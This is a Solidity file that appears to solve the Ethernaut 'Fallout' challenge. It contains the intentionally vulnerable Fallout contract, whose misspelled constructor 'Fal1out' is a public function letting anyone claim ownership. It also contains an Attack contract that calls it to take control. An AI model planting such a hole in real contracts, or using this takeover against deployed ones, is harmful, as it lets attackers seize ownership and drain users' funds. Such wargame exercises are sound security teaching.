// 0.8 was used for testing purpose but is mainly because Fal1out is mistyped
pragma solidity ^0.8.0;

interface IFallout {
    function owner() external view returns (address);

    // call this function
    function Fal1out() external payable;
}

contract Attack {
    constructor(IFallout add) payable {
        add.Fal1out{value: msg.value}();
    }
}

contract Fallout {
    mapping(address => uint) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = payable(msg.sender);
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] += msg.value;
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint) {
        return allocations[allocator];
    }
}
